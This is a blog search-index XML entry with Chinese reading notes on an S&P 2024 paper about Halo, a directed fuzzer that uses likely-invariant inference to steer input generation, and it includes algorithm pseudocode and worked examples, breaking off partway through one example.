<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>通过不变量的反例引导的定向Fuzziung</title>
      <link href="/2024/04/03/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E9%80%9A%E8%BF%87%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E5%8F%8D%E4%BE%8B%E5%BC%95%E5%AF%BC%E7%9A%84%E5%AE%9A%E5%90%91Fuzzing/"/>
      <url>/2024/04/03/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E9%80%9A%E8%BF%87%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E5%8F%8D%E4%BE%8B%E5%BC%95%E5%AF%BC%E7%9A%84%E5%AE%9A%E5%90%91Fuzzing/</url>
      
        <content type="html"><![CDATA[<h2 id="counterexample-guided-directed-fuzzing-via-likely-invariant-inference" tabindex="-1">Counterexample-Guided Directed Fuzzing via Likely Invariant Inference</h2><ul><li>引用：Huang H, Zhou A, Payer M, et al. Everything is Good for Something: Counterexample-Guided Directed Fuzzing via Likely Invariant Inference[C], 2024 IEEE Symposium on Security and Privacy (SP). IEEE Computer Society, 2024: 142-142.</li><li>CCF A S&amp;P , IEEE Symposium on Security and Privacy</li><li><a href="https://www.researchgate.net/profile/Heqing-Huang-14/publication/377767294_Everything_is_Good_for_Something_Counterexample-Guided_Directed_Fuzzing_via_Likely_Invariant_Inference/links/65b786ab1bed776ae3138790/Everything-is-Good-for-Something-Counterexample-Guided-Directed-Fuzzing-via-Likely-Invariant-Inference.pdf">链接</a></li></ul><h3 id="1-%E6%91%98%E8%A6%81" tabindex="-1">1 摘要</h3><ul><li>定向模糊有很多应用，如 补丁回归测试[1,2],漏洞重现[3,4],验证静态分析报告[5,6],为各种漏洞生成概念验证输入[7]</li><li>现有定向模糊测试输入许多都与目标无关，我们称为<strong>indirect input generation</strong>。<ul><li>[10,12-16] 使用种子突变，产生95%的输入与目标无关</li><li>[17,18,19] 拒绝了一些输入，但仍然有大量无关输入</li></ul></li><li>本文提出一种高效的，定向灰盒fuzzing技术来解决<strong>indirect input generation</strong>。<ul><li>关键见解是通从可达和不可达的执行输入中推断出可能的不变量，以限制后续输入生成的搜索空间并产生更多可达的输入。</li><li>此外，为了高效的产生输入满足目标状态，我们提出两种策略优化可能的不变量推理，<ul><li>distance-based input selection，减少输入使得不变量推断更加高效</li><li>similarity-based invariant selection，消除不准确的不变量使得输入生成更加高效</li></ul></li></ul></li><li>我们在灰盒fuzzer Halo实现了我们这个输入限制的模糊测试方法<ul><li>使用Magma[20]benchmark</li><li>4种SOTA directed fuzzers:AFLGO[10],Beacon[17],WindRanger[15],SelectFuzz[16]</li><li>4种SOTA non-directed fuzzers:AFL[21],AFL++[22],ParmeSan[23],SymCC[24]</li><li>结果现实，Halo6.2x产生可达输入，漏洞重现快15.3x,并检查出了更多的漏洞</li></ul></li><li>本文贡献总结<ul><li><ol><li>提出利用已执行的输入动态推断可能的不变量，以限制后续输入生成的搜索空间，从而加速定向模糊测试中的漏洞重现过程</li></ol></li><li><ol start="2"><li>设计了两种新颖的选择策略，以提高输入生成的效率，有效地减少了生成的不相关输入的比例</li></ol></li><li><ol start="3"><li>我们提供了实证证据证明我们的方法比SOTA定向模糊器更高效，有效</li></ol></li></ul></li></ul><h3 id="2-%E5%8A%A8%E6%9C%BA" tabindex="-1">2 动机</h3><ul><li>2.1：现有工作的intuition及 justify 他们的弱点</li><li>2.2：陈述我们解决这些问题的动机</li></ul><h4 id="2.1-existing-directed-fuzzers" tabindex="-1">2.1 Existing Directed Fuzzers</h4><ul><li>定向模糊测试的主要目的：examine the program behaviors defined by the targets.</li><li>现在SOTA定向模糊测试中，主要有两种趋势<ul><li><ol><li>通过选择promising seeds来接近目标</li></ol></li><li><ol start="2"><li>消除无法达到目标的输入的不可达执行</li></ol></li></ul></li></ul><h5 id="2.1.1-sophisticated-seed-scheduling" tabindex="-1">2.1.1 Sophisticated Seed Scheduling</h5><ul><li>[10,12,13,14]致力于选择具有最高检测目标行为概率的种子,使用各种使用度函数衡量达到目标的可能性<ul><li>AFLGO[10] 优先考虑与控制流图中目标的最小距离的种子</li><li>Hawkeye[13] 通过考虑从崩溃报告中获得的平均“call-trace-distance”来优化此距离度量</li><li>CAFL[12] 通过必要的指令来细化调用跟踪以触发崩溃</li><li>WindRanger[15] 通过仅收集从控制流偏移块到目标的距离来改进适应度</li><li>SelectFuzz[16] 通过数据依赖仅计算从变量和块到目标的距离。另一种方法是衡量达到目标的困难程度</li><li>MC2[14] 将定向模糊测试转换为蒙特卡罗计数模型，使用每个分支的执行频率来近似达到目标的困难程度，并优先考虑具有最低困难度的种子。</li></ul></li><li>尽管有许多基于优先级的方法帮助fuzzing更快地定位到目标，但主要的输入生成方法依赖随机突变，只有一小部分有限的种子输入，结果导致大量的无关输入被运行</li></ul><h5 id="2.1.2-culling-infeasible-executions" tabindex="-1">2.1.2 Culling Infeasible Executions</h5><ul><li>一些fuzzer-created inputs绝不会达到目标行为，为了减少这些运行，一些fuzzer会在清除知道不会达到目标的时候停止执行[17,18,19]<ul><li>FuzzGuard[18] 使用机器学习模型预测是否可达</li><li>Beacon[17] 推断必要的达到目标的preconditions，如违反则停止执行</li><li>SieveFuzz[19] 提出根据动态反馈自适应地优化可以被除去的路径，减少不可达的执行</li></ul></li><li>尽管拒绝一些输入可以提高效率，但这仍然是一种补偿性措施，因为没有迹象表明可以直接生成针对目标的输入。</li></ul><h4 id="2.2-example-and-key-challenges" tabindex="-1">2.2 Example and Key Challenges</h4><p><img src="/images/%E8%AE%BA%E6%96%87/invariant/2_1.png" alt></p><ul><li>图1中，假设我们有三个种子<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>15</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(a,b,c,d):(15,5,10,10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">B(a,b,c,d):(5,5,10,10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>15</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(a,b,c,d):(15,5,10,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></eq></li></ul></li><li>现有fuzzer可以优先选择种子 B 而不是种子 A 和 C，因为种子 B 可以到达第 12 行，而种子 A 和 C 到达第 11 行，但是随机变异种子可能不会快速满足第 11-13 行的紧密路径条件，更不用说满足溢出条件 a + b + c &gt; sizeof(buf)</li><li>虽然种子 B 被优先考虑，但是模糊测试工具仍然可能生成大量违反路径条件的输入，导致探索与目标无关的程序，例如第 18 行的代码块。</li><li>另一方面，消除导致目标的不可行执行并不帮助生成朝向目标的输入。例如，Beacon [17] 可能根据可达性和路径条件终止执行。因此，一旦执行到达第 18 行，模糊测试工具可以停止执行输入。然而，模糊测试工具仍然缺乏如何生成满足第 11-14 行条件的输入的知识</li></ul><h5 id="motivation" tabindex="-1">Motivation</h5><ul><li>存在 <strong>indirect input generation</strong> 的问题的关键原因是输入生成对目标路径条件的无视。我们注意到，即使现有方法可以通过额外的反馈优化种子选择或消除不必要的执行，我们仍必须为 定向模糊测试 特化输入生成，以便更快地到达目标。</li><li>然而，到目前为止，现有方法错过了这个优化机会，具体来说，现有方法仅保留了执行种子时的少量反馈哦，仅占生成输出的一小部分，大多数输入在执行后被丢弃</li><li>例如，下表显示，SOTA AFLGO在Magma基准测试中仅保留了少于0.01%的执行输入反馈，因此在我们4.1AFLGo 不能有效地重现大多数目标（基准测试中的 138 个目标中的 19 个）<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/2_2.png" alt></li><li>因此，我们的想法是利用执行的输入来近似目标条件，这可以限制后续输入生成的搜索空间。</li><li>我们使用图2说明我们的基本想法。输入可以视为从各种程序路径的分布中取样，这些路径的条件（谓语）是区分路径的边界。由于fuzz高效的输入生成速度，我们可以通过大量样本推断这些边界。<ul><li>例如，通过观察上一个例子中对种子A，B，C中的a值进行变异生成的输入，我们可以近似认为达到目标的条件是a&lt;15,其是11行的否定条件的一个值，尽管还没有达到a&lt;10，但之后就不需要生成a&gt;=15的输入。此外，如果发现反例a=10，则可以进一步改进这个近似</li></ul></li><li>目前，有效地近似条件和生成输入面临两个主要挑战：</li><li><strong>Challenge 1. How to infer conditions from executed inputs efficiently?</strong><ul><li>为了实现高效性，模糊测试工具必须以尽可能少的输入准确推断条件。<br>虽然模糊测试工具能够生成大量输入，但为每个输入记录反馈可能会带来显着的开销。<br>因此，需要有效的输入选择策略，仅选择必要的输入进行条件推断，从而最大程度地减轻对模糊测试工具资源的负担。</li></ul></li><li><strong>Challenge 2. How to generate inputs constrained by conditions efficiently?</strong><ul><li>为了有效地重现目标，模糊测试工具应该使用推断的条件高效地生成受限制的输入，而不是持续调用昂贵的约束求解器。</li><li>然而，条件可能各不相同，而并非所有条件都同样有用；例如，条件 b &gt; 1 与条件 a &lt; 10 分别相比对变量 b,a 的搜索空间的约束可能不那么显著。</li><li>条件复杂化不仅可能减慢输入生成速度，还可能导致生成的输入未能达到目标。</li><li>因此，有效地确定推断条件的有用性对于提高输入生成的质量至关重要。</li></ul></li></ul><h3 id="3-counterexample-guided-directed-fuzzing" tabindex="-1">3  Counterexample-guided Directed Fuzzing</h3><ul><li>接下来介绍Halo，一个定向fuzzer可以有效的通过使用条件估计限制输入来生成导向目标的输入</li><li>如图3示，我们的核心功能是基于fuzzers生成的输入的运行来推断出一系列可以代表环境路径的不变量（Section3.1）. 为了有效地推断不变量（Chanllenge 1），我们通过选择具有代表性的可以准确推断不变量的输入，减少了推断引擎的输入数量（Section3.2）.为了更好地生成满足不变量地输出（Challenge 2），我们根据来自模糊测试的自适应执行反馈来降低那些不能精确描述路径条件的不变式的优先级，这样做是为了增加生成可行输入的概率<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/2_4.png" alt></li></ul><h4 id="3.1-intuition%3A-approximating-the-condition-with-dynamic-likely-invariant-inference" tabindex="-1">3.1 intuition: Approximating the Condition with Dynamic Likely-Invariant Inference</h4><ul><li>算法如下图示<ul><li>当fuzzer开始根据所选种子生成输入时，line 2</li><li>Halo通过基于一系列通过种子生成的输入估计导向目标的条件 line3-8</li></ul></li><li>直觉上，路径条件可以被视为一个满足多个输入的不变量，因此，我们的基本直觉是找到可以满足所有输入的不变量作为目标条件的估计。</li><li>根据这个直觉，我们提出了一种轻量级方法，灵感来自[25],不变量作为输入表示的目标路径条件的近似值，可以约束后续输入产生</li></ul><pre><code class="language-Java">Algorithm 1 Counterexample-guided Directed FuzzingRequire: Seeds S, Target t1: repeat2:      s, I_use ← ChooseNext(S) //I_use为使用的不变量3:      if I_use = ∅ or I_use is not effective then4:          Sreach, Sunreach ← InputSelect(s, t) (§3.2)5:          Ireach ← InvInfer(Sreach)6:          Iunreach ← InvInfer(Sunreach)7:          I_use ← InvSelect(Ireach, ¬Iunreach) (§3.3)8:      end if9:      Inputnew ← Sample(I_use)10:     Tracing(Inputnew)11:     Havoc&amp;Splice(s)12: until Timeout is reached</code></pre><h5 id="preliminary-of-invariant-inference" tabindex="-1">Preliminary of Invariant Inference</h5><ul><li>使用一系列输入 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>  ，推断引擎推断出一组不变量 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> ，对于 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo>∈</mo><mi>S</mi><mo separator="true">,</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi>i</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>i</mi><mo>∈</mo><mi>I</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\forall x \in S , x |= i,(i\in I)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span></span></span></span></eq> ，我们使用I来近似 达到目标所需的条件路径</li><li>现有的不变量推理方法[25,26,27]通过分治搜索来获得精确的肯呢个不变量，并保证算法的种植。具体来说，不变量推理从形式范围 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[min,max]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">min</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span></eq> 的过近似开始，对于一组不变量模板，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><msub><mi>t</mi><mn>1</mn></msub><mo>+</mo><msub><mi>c</mi><mn>2</mn></msub><msub><mi>t</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>c</mi><mi>n</mi></msub><msub><mi>t</mi><mi>n</mi></msub><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">c_1t_1+c_2t_2...+c_nt_n\geq 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq>,其中包含n的系数c，和关系t，由程序变量的多项式组成，用于近似路径条件</li><li>根据给定输入，推理引擎首先检查输入时候能够在执行时满足当前不变量，如果可以不发生任何变化。否则，算法会根据反例来缩小输入范围，同时，没有有效范围的模板不变量将被丢弃</li><li>因此，不变量推理的准确度取决于给定的输入和模板不变量。随着更多输入的提供，算法逐渐细化不变量得到更高的精度</li><li><strong>Example 3.1</strong><ul><li>假设推断引引擎从 $(-\infty,+\infty) $ 推断三个模板不变量 a,b,a+b,来估计图1中12行的状态</li><li>对于给定输入 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mn>5</mn><mo separator="true">,</mo><mi>b</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a=5,b=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq> , 推断引擎通过运行反馈发现其不能满足条，随后缩小不变量的范围 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>a</mi><mo>+</mo><mi>b</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a\in(5,+\infty),b\in(0,+\infty),a+b\in(5,+\infty)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span></span></span></span></eq> 来提高精确度</li></ul></li><li>本工作的目标不是改进不变量推理算法，而是明确地应用不变量推理改善定向模糊测试<ul><li>具体来首，我们使用SOTA不变量推理引擎Dig[26]. 采用的模板不变式包括常数检查、涉及单个变量的下界检查以及多个变量之间的线性不等式依赖关系(这些在现有不变量推理技术中广泛被作为默认设置[25,26,28,29])</li></ul></li><li>值得注意的，选择理想的不变量模板仍是动态不变量推理的一个挑战，这不是我们的值嗯点，我们将在第5节提供更多工作细节</li></ul><h5 id="input-collection" tabindex="-1">Input Collection</h5><ul><li>通过fuzzing生成的大量测试用例，Halo可以推断不变量来促进更好的输入生成。</li><li>具体的，Halo记录input和他们到达目标的值（算法1中line 4）</li><li>我们使用执行反馈将输入分为两组：可达和不可达的输入，以便推断不变量。Section3.2描述了分组的相关细节</li><li><strong>Example 3.2</strong><ul><li>考虑图一中的程序有五个输入没有触发崩溃<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>15</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(a,b,c,d):(15,5,10,10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span 